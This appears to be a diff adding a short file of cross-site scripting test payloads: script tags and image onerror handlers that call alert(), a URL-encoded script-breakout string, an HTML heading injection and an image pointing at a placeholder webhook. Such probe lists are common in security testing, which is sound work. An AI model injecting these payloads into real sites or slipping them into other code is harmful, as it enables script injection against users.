@@ -1,0 +1,7 @@
+<img src="" onerror="javascript:alert(1)" />
+<img src="WEBHOOK" />
+d1bvs%3c%2fscript%3e%3cscript%3ealert(`5h1Nn`)%3c%2fscript%3ec579g
+<h1>test_123</h1>
+<script>alert(2)</script>
+<img/src=''onerror='javascript:alert(3)'>
+<script>alert(`4`)</script>
